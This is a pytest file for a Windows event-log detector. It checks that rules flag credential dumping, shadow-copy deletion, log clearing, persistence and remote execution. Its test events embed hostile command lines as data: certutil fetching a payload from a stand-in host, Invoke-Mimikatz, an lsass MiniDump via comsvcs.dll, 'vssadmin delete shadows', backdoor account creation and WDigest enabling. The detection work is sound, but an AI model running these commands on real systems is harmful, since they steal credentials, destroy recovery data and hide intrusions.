"""Windows event logs (Security / Sysmon / PowerShell / Defender) -> incidents (added 26 Oct).

Events here are written in the real export formats (NXLog flat JSON as in OTRF Security-Datasets, nested Winlogbeat
JSON, Event Viewer XML). The rules' results on real attack recordings come from app/ml/training/test_windows_rules.py.
"""
import io
import json
from datetime import datetime, timedelta

import pytest

from app.detectors import cyber_threat as C
from app.detectors import windows_events as W

T0 = datetime(2026, 10, 20, 10, 0, 0)


def ev(eid, channel="Security", host="ws01.corp.local", t=0, **fields):
    return {"EventID": eid, "Channel": channel, "Hostname": host,
            "@timestamp": (T0 + timedelta(seconds=t)).strftime("%Y-%m-%dT%H:%M:%S.000Z"), **fields}


def jl(*events):
    return "\n".join(json.dumps(e) for e in events)


def rules_of(text):
    return {(i["rule"], i["severity"]) for i in W.analyze_text(text)["incidents"]}


# ---------------------------------------------------------------------------------------------------------- reading
def test_reads_flat_nested_and_xml_exports():
    flat = jl(ev(4720, SubjectUserName="ravi", TargetUserName="backdoor"))
    nested = json.dumps({"@timestamp": "2026-10-20T10:00:00Z", "winlog": {"event_id": 4720, "channel": "Security",
                         "computer_name": "WS01", "event_data": {"SubjectUserName": "ravi", "TargetUserName": "bkp"}}})
    xml = ('<Events><Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>4720'
           '</EventID><TimeCreated SystemTime="2026-10-20T10:00:00.000Z"/><Channel>Security</Channel><Computer>WS01'
           '</Computer></System><EventData><Data Name="SubjectUserName">ravi</Data><Data Name="TargetUserName">x'
           '</Data></EventData></Event></Events>')
    for text, kind in ((flat, "json"), (nested, "json"), (xml, "xml")):
        evs, k = W.parse(text)
        assert k == kind and len(evs) == 1 and evs[0]["id"] == 4720 and evs[0]["subject_user"] == "ravi"
        assert evs[0]["t"] == T0 and evs[0]["host"] == "WS01"
    assert W.parse('<!DOCTYPE x [<!ENTITY a "b">]><Events><Event><System><EventID>1</EventID></System></Event></Events>')[0] == []
    assert W.looks_like("hello world") == "" and W.looks_like("date,user,pc,activity\n") == ""


def test_utc_time_is_preferred_over_local_time():
    e = ev(4720, SubjectUserName="ravi", TargetUserName="x", EventTime="2026-10-20 02:00:00")   # local, 8 h behind
    assert W.parse(jl(e))[0][0]["t"] == T0


# ------------------------------------------------------------------------------------------------------------ rules
def test_command_rules_on_process_and_powershell_events():
    text = jl(ev(4688, NewProcessName=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                 CommandLine="powershell -nop -w hidden -enc SQBFAFgA", SubjectUserName="ravi"),
              ev(1, "Microsoft-Windows-Sysmon/Operational", Image=r"C:\Windows\System32\certutil.exe",
                 CommandLine="certutil -urlcache -split -f http://x/a.exe a.exe", User="CORP\\ravi"),
              ev(4104, "Microsoft-Windows-PowerShell/Operational", ScriptBlockText="Invoke-Mimikatz -DumpCreds"),
              ev(4688, NewProcessName=r"C:\Windows\System32\vssadmin.exe", CommandLine="vssadmin delete shadows /all"),
              ev(4688, NewProcessName=r"C:\Windows\System32\cmd.exe", CommandLine="wevtutil cl Security"),
              ev(4688, NewProcessName=r"C:\Windows\System32\cmd.exe", CommandLine="net user evil P@ss1 /add"))
    r = rules_of(text)
    for rule in ("encoded_ps", "lolbin", "cred_dump", "recovery_off", "security_off", "add_user"):
        assert any(k == rule for k, _ in r), rule


def test_office_starting_a_shell_and_lsass_reads():
    text = jl(ev(4688, ParentProcessName=r"C:\Program Files\Microsoft Office\WINWORD.EXE",
                 NewProcessName=r"C:\Windows\System32\cmd.exe", CommandLine="cmd /c whoami", SubjectUserName="asha"),
              ev(10, "Microsoft-Windows-Sysmon/Operational", SourceImage=r"C:\Users\x\Desktop\dumper.exe",
                 TargetImage=r"C:\Windows\system32\lsass.exe", GrantedAccess="0x1010"),
              ev(10, "Microsoft-Windows-Sysmon/Operational", SourceImage=r"C:\Windows\system32\svchost.exe",
                 TargetImage=r"C:\Windows\system32\lsass.exe", GrantedAccess="0x1fffff"),
              ev(10, "Microsoft-Windows-Sysmon/Operational", SourceImage=r"C:\Program Files\x\agent.exe",
                 TargetImage=r"C:\Windows\system32\lsass.exe", GrantedAccess="0x1000"))       # no memory read
    inc = W.analyze_text(text)["incidents"]
    assert any(i["rule"] == "office_child" and i["user"] == "asha" for i in inc)
    lsass = [i for i in inc if i["rule"] == "lsass_read"]
    assert len(lsass) == 1 and "dumper.exe" in lsass[0]["examples"][0]


def test_account_and_group_changes_including_non_english_group_names():
    text = jl(ev(4720, SubjectUserName="ravi", TargetUserName="backdoor"),
              ev(4732, SubjectUserName="ravi", TargetUserName="Administratoren", TargetSid="S-1-5-32-544",
                 MemberName="-", MemberSid="S-1-5-21-1-2-3-1001"),
              ev(4732, SubjectUserName="ravi", TargetUserName="Printers-Floor2", TargetSid="S-1-5-21-1-2-3-3001",
                 MemberName="CN=asha,OU=Staff", MemberSid="S-1-5-21-1-2-3-1002"),
              ev(4724, SubjectUserName="ravi", TargetUserName="boss"))
    inc = W.analyze_text(text)["incidents"]
    g = sorted((i for i in inc if i["rule"] == "group_add"), key=lambda i: i["severity"])
    assert [i["severity"] for i in g] == ["critical", "medium"]
    assert "S-1-5-21-1-2-3-1001 -> Administratoren" in g[0]["examples"][0]           # SID shown when name is "-"
    assert {"user_created", "pwd_reset"} <= {i["rule"] for i in inc}


def test_security_controls_and_persistence():
    text = jl(ev(1102, SubjectUserName="ravi"), ev(4719, SubjectUserName="ravi"),
              ev(5001, "Microsoft-Windows-Windows Defender/Operational"),
              ev(4698, SubjectUserName="ravi", TaskName=r"\Updater",
                 TaskContent=r"<Exec><Command>powershell.exe</Command><Arguments>-enc AAA</Arguments></Exec>"),
              ev(4698, SubjectUserName="WS01$", TaskName=r"\Microsoft\Windows\Defrag",
                 TaskContent=r"<Exec><Command>%windir%\system32\defrag.exe</Command></Exec>"),
              ev(7045, "System", ServiceName="PSEXESVC", ImagePath=r"%SystemRoot%\PSEXESVC.exe"),
              ev(7045, "System", ServiceName="MpKslDrv",
                 ImagePath=r"C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{x}\MpKslDrv.sys"),
              ev(13, "Microsoft-Windows-Sysmon/Operational",
                 TargetObject=r"HKU\S-1\Software\Microsoft\Windows\CurrentVersion\Run\Updater",
                 Details=r"powershell.exe -w hidden -c iex"),
              ev(13, "Microsoft-Windows-Sysmon/Operational",
                 TargetObject=r"HKU\S-1\Software\Microsoft\Windows\CurrentVersion\Run\com.squirrel.Teams.Teams",
                 Details=r"C:\Users\x\AppData\Local\Microsoft\Teams\Update.exe --processStart Teams.exe"))
    r = rules_of(text)
    assert {("log_cleared", "critical"), ("audit_policy", "high"), ("defender_off", "critical")} <= r
    assert ("sched_task", "high") in r and ("sched_task", "low") in r                 # Defrag task is only a note
    assert ("service_install", "high") in r and ("service_install", "low") in r       # Defender driver is a note
    assert ("run_key", "medium") in r and ("run_key", "low") in r                     # Teams autostart is a note


def test_discovery_burst_and_password_guessing():
    cmds = ["whoami", "ipconfig /all", "net user", "nltest /dclist:", "systeminfo", "tasklist"]
    burst = [ev(4688, t=i * 30, NewProcessName=r"C:\Windows\System32\cmd.exe", CommandLine=c, SubjectUserName="ravi")
             for i, c in enumerate(cmds)]
    agent = [ev(4688, t=i * 30, NewProcessName=r"C:\Windows\System32\cmd.exe", CommandLine=c, SubjectUserName="WS01$")
             for i, c in enumerate(cmds)]
    fails = [ev(4625, t=i * 5, TargetUserName="boss", IpAddress="10.0.0.9") for i in range(12)]
    ok = [ev(4624, t=70, TargetUserName="boss", LogonType="10", IpAddress="10.0.0.9")]
    inc = W.analyze_text(jl(*burst, *agent, *fails, *ok))["incidents"]
    d = {i["user"]: i["severity"] for i in inc if i["rule"] == "discovery"}
    assert d == {"ravi": "medium", "WS01$": "low"}
    bf = next(i for i in inc if i["rule"] == "brute_force")
    assert bf["severity"] == "critical" and "successful" in bf["label"]


def test_interactive_logons_feed_the_insider_baseline():
    evs = [ev(4624, t=d * 86400, TargetUserName="asha", LogonType="2") for d in range(8)]
    evs += [ev(4624, t=d * 86400 + 60, TargetUserName="ANONYMOUS LOGON", LogonType="3") for d in range(8)]
    s = W.analyze_text(jl(*evs))
    assert s["activityDays"] == 8 and s["_activity"].count(",asha,WS01,logon,") == 8
    assert "ANONYMOUS" not in s["_activity"]


# ---------------------------------------------------------------------------------------------------- .evtx files
def test_evtx_reader_reports_damaged_files_and_time_limits(tmp_path):
    from app.services import subtopic_router as SR
    bad = tmp_path / "broken.evtx"
    bad.write_bytes(b"ElfFile\x00" + b"\x00" * 200)
    assert SR.file_kind(str(bad), "broken.evtx") == "evtx"
    pytest.importorskip("Evtx")
    xml, note = W.evtx_to_xml(str(bad))
    assert xml == "" and "No events could be read" in note                             # nothing invented
    xml, note = W.evtx_to_xml(str(bad), timeout=0.001)
    assert xml == "" and "was stopped" in note


# ------------------------------------------------------------------------------------------------ app integration
def test_cyber_engine_router_playbook_and_store():
    from app.services import mitre, response_playbook, scan_store, subtopic_router as SR
    text = jl(ev(4688, NewProcessName=r"C:\Windows\System32\rundll32.exe", SubjectUserName="ravi",
                 CommandLine=r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\t\l.dmp full"),
              ev(4720, SubjectUserName="ravi", TargetUserName="backdoor"))
    c = SR.classify(module_id="cyber-threat", text_input=text, url_input=None, file_path=None, file_name=None,
                    extra_field_values=None)
    assert c.subtopic_id == "insider-risk" and "Windows event log" in c.reasons[0]
    r = C.analyze_event_text(text, {}, "Insider Risk")
    labels = [i["label"] for i in r["indicators"] if i["triggered"]]
    assert r["riskScore"] >= 80 and "Windows: Password / credential theft tool (ravi on WS01)" in labels
    assert not any(lab.startswith(("Command shell", "Suspicious command")) for lab in labels)   # not counted twice
    assert r["explanation"].startswith("Read 2 Windows events")
    assert {"T1003", "T1136.001"} <= set(mitre.annotate("cyber-threat", "insider-risk", r))
    titles = [a["title"] for a in response_playbook.build_actions(r, "cyber-threat", "insider-risk", "x")]
    assert "Reset passwords used on the affected computers" in titles and "Review new accounts and group changes" in titles
    d = scan_store.detail_fields(r)["windowsEvents"]
    assert d["events"] == 2 and d["incidents"][0]["user"] == "ravi"


def test_uploading_windows_logs(auth_client):
    text = jl(ev(4688, NewProcessName=r"C:\Windows\System32\cmd.exe", CommandLine="vssadmin delete shadows /all /quiet",
                 SubjectUserName="ravi"))
    for name in ("security.json", "security.xml"):
        body = text if name.endswith(".json") else (
            '<Events><Event><System><EventID>4688</EventID><TimeCreated SystemTime="2026-10-20T10:00:00Z"/>'
            '<Channel>Security</Channel><Computer>WS01</Computer></System><EventData><Data Name="CommandLine">'
            'vssadmin delete shadows /all /quiet</Data><Data Name="SubjectUserName">ravi</Data></EventData></Event>'
            '</Events>')
        files = {"file": (name, io.BytesIO(body.encode()), "application/octet-stream")}
        r = auth_client.post("/api/analysis/scan", data={"moduleId": "cyber-threat", "subtopicId": "auto",
                                                          "subtopicTitle": "Auto-detect"}, files=files)
        assert r.status_code == 200, r.text
        assert r.json()["subtopicId"] == "insider-risk" and r.json()["windowsEvents"]["incidents"][0]["rule"] == "recovery_off"


def test_an_unreadable_evtx_is_unverified_not_clean(auth_client):
    pytest.importorskip("Evtx")
    files = {"file": ("broken.evtx", io.BytesIO(b"ElfFile\x00" + b"\x00" * 200), "application/octet-stream")}
    r = auth_client.post("/api/analysis/scan", data={"moduleId": "cyber-threat", "subtopicId": "auto",
                                                      "subtopicTitle": "Auto-detect"}, files=files)
    assert r.status_code == 200, r.text
    assert r.json()["classification"] == "unverified" and "No events could be read" in r.json()["explanation"]


def test_one_clock_per_file_even_when_only_some_events_have_utc():
    # as in a real OTRF export: Sysmon events carry UtcTime, every event carries TimeCreated (local time)
    sysmon = {"EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "WS01",
              "UtcTime": "2026-10-20 23:50:09.088", "TimeCreated": "2026-10-20 07:50:09.089",
              "Image": r"C:\Windows\System32\cmd.exe", "CommandLine": "vssadmin delete shadows /all"}
    sec = {"EventID": 4688, "Channel": "Security", "Hostname": "WS01", "TimeCreated": "2026-10-20 07:50:06.220",
           "NewProcessName": r"C:\Windows\System32\vssadmin.exe", "CommandLine": "vssadmin delete shadows /all"}
    evs = W.parse(jl(sysmon, sec))[0]
    assert abs((evs[0]["t"] - evs[1]["t"]).total_seconds()) < 10                    # same clock: seconds apart


# ---- rules added 26 Oct (written from MITRE ATT&CK; tested on OTRF + EVTX-ATTACK-SAMPLES) -----------------------
SYS = "Microsoft-Windows-Sysmon/Operational"


def test_registry_tampering_with_protections():
    r = rules_of(jl(
        ev(13, SYS, Image=r"C:\Windows\System32\reg.exe", TargetObject=r"HKLM\System\CurrentControlSet\Services\EventLog\Start",
           Details="DWORD (0x00000004)"),
        ev(12, SYS, t=1, Image=r"C:\Temp\payload.exe", TargetObject=r"HKLM\System\CurrentControlSet\Control\MiniNt"),
        ev(13, SYS, t=2, Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
           TargetObject=r"HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential",
           Details="DWORD (0x00000001)"),
        ev(13, SYS, t=3, Image=r"C:\Windows\System32\reg.exe",
           TargetObject=r"HKLM\System\CurrentControlSet\Control\Terminal Server\fDenyTSConnections", Details="DWORD (0x00000000)"),
        ev(13, SYS, t=4, Image=r"C:\Windows\System32\services.exe",
           TargetObject=r"HKLM\System\CurrentControlSet\Services\Updater\ImagePath", Details="%COMSPEC% /C start /b x.exe")))
    assert {("log_off_reg", "critical"), ("wdigest_on", "critical"), ("rdp_on", "medium"), ("service_reg", "high")} <= r


def test_normal_registry_writes_are_quiet():
    r = rules_of(jl(
        ev(13, SYS, Image=r"C:\Windows\System32\svchost.exe",
           TargetObject=r"HKLM\System\CurrentControlSet\Control\Lsa\LmCompatibilityLevel", Details="DWORD (0x00000002)"),
        ev(13, SYS, t=1, Image=r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe",
           TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows Defender\Features\DisableX", Details="DWORD (0x00000001)"),
        ev(13, SYS, t=2, Image=r"C:\Windows\System32\services.exe",
           TargetObject=r"HKLM\System\CurrentControlSet\Services\cbdhsvc_2739d6\ImagePath",
           Details=r"C:\windows\system32\svchost.exe -k ClipboardSvcGroup -p")))
    assert not {x for x in r if x[1] != "low"}


def test_wmi_subscriptions_injection_and_remote_commands():
    r = rules_of(jl(
        ev(20, SYS, Name='"Updater"', Destination='"powershell -NonI -W hidden -enc AAAA"'),
        ev(5861, "Microsoft-Windows-WMI-Activity/Operational", t=1,
           Message='Namespace = //./root/subscription; Consumer = NTEventLogEventConsumer="SCM Event Log Consumer"'),
        ev(8, SYS, t=2, SourceImage=r"C:\Windows\System32\mavinject.exe", TargetImage=r"C:\Windows\System32\notepad.exe"),
        ev(8, SYS, t=3, SourceImage=r"C:\Windows\System32\csrss.exe", TargetImage=r"C:\Windows\explorer.exe"),
        ev(1, SYS, t=4, ParentImage=r"C:\Windows\System32\wbem\WmiPrvSE.exe", Image=r"C:\Windows\System32\cmd.exe",
           CommandLine="cmd.exe /Q /c whoami 1> \\\\127.0.0.1\\ADMIN$\\__1"),
        ev(1, SYS, t=5, ParentImage=r"C:\Windows\System32\wsmprovhost.exe",
           Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", CommandLine="powershell -nop")))
    inc = W.analyze_text(jl(ev(5861, "Microsoft-Windows-WMI-Activity/Operational",
                               Message='Consumer = NTEventLogEventConsumer="SCM Event Log Consumer"')))
    assert not inc or not inc["incidents"]                        # Windows' own subscription: not an incident
    assert {("wmi_subscription", "high"), ("remote_thread", "high"), ("remote_child", "high")} <= r
    labels = {i["label"] for i in W.analyze_text(jl(ev(1, SYS, ParentImage=r"C:\Windows\System32\wsmprovhost.exe",
                                                          Image=r"C:\Windows\System32\cmd.exe")))["incidents"]}
    assert "Command started from another computer (PowerShell remoting)" in labels


def test_admin_pipes_over_the_network():
    r = rules_of(jl(
        ev(5145, SubjectUserName="pgustavo", IpAddress="172.18.39.5", ShareName=r"\\*\IPC$", RelativeTargetName="svcctl"),
        ev(5145, t=1, SubjectUserName="pgustavo", IpAddress="172.18.39.5", ShareName=r"\\*\IPC$", RelativeTargetName="samr")))
    assert {("remote_admin_pipe", "high"), ("remote_discovery_pipe", "medium")} <= r
    quiet = rules_of(jl(ev(5145, SubjectUserName="WS01$", IpAddress="172.18.39.9", ShareName=r"\\*\IPC$",
                           RelativeTargetName="samr")))
    assert not quiet                                             # computers' own accounts do this all day
